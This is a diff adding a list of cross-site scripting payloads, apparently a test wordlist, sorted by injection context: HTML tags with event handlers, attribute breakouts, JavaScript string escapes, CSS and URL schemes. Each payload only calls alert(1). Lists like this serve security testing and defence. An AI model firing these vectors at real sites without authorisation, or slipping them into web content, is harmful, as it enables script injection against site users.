@@ -1,0 +1,44 @@
+# Context-aware XSS payloads for different injection points
+# HTML context payloads
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# Attribute context payloads
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+" onclick="alert(1)
+' onclick='alert(1)
+" onload="alert(1)
+' onload='alert(1)
+
+# JavaScript context payloads
+;alert(1);//
+;alert(1);/*
+*/alert(1);//
+*/alert(1);/*
+\';alert(1);//
+\";alert(1);//
+\\\";alert(1);//
+\\\';alert(1);//
+
+# CSS context payloads
+</style><script>alert(1)</script>
+expression(alert(1))
+url(javascript:alert(1))
+/*</style><script>alert(1)</script>*/
+
+# URL context payloads
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+vbscript:alert(1)
